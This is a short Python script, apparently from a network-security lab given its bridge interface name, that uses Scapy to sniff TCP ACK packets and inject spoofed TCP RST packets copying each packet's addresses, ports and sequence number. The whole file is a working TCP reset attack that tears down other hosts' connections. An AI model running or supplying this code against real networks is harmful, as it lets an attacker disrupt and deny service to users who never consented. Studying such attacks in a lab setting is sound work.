from scapy.all import *

# Spoofing TCP RST packet
def spoof_rst(pkt):

    ip  = IP(src=pkt[IP].src, dst=pkt[IP].dst)
    tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="R", seq=pkt[TCP].seq)

    spoofed_pkt = ip/tcp
    ls(spoofed_pkt)
    send(spoofed_pkt, verbose=0)



f = 'tcp[13] & 16 != 0' # Only Captures TCP Ack packets
pkt = sniff(iface='br-757ff15f5179', filter=f, prn=spoof_rst)